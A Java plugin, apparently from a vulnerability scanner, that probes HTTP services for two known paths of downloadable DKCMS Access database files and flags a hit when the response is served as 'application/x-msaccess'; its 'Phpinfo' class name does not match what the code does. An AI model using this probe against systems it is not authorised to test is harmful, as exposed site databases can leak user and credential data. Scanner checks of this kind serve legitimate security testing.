package cn.com.sgcc.marki_with_maven.modules;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

import org.apache.http.Header;
import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;

import cn.com.sgcc.marki_with_maven.misc.Tools;

public class FinialshopPhpinfo implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "FinialshopPhpinfo");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceType.toLowerCase().contains("http"))
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		CloseableHttpClient customClient = null;
		try {
			String[] uris = new String[]{"data/dkcm_ssdfhwejkfs.mdb", "_data/___dkcms_30_free.mdb"};
			boolean isBreak = false;
			for (String uri : uris)
			{
				if(isBreak)
					break;
				String url = String.format("%s://%s:%s/"+uri, serviceType.contains("https") ? "https":"http", ip, port );
				HttpGet httpGet = new HttpGet(url);
				customClient = new Tools().getCustomClient();
				CloseableHttpResponse resp = customClient.execute(httpGet);
				if (resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK)
				{
					for (Header head : resp.getAllHeaders())
					{
						if(head.getValue().contains("application/x-msaccess"))
						{
							success = true;
							isBreak = true;
							break;
						}
					}
				}
				httpGet.releaseConnection();
			}
			
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return success;
	}

	public static void main(String[] args) {
		
	}

}
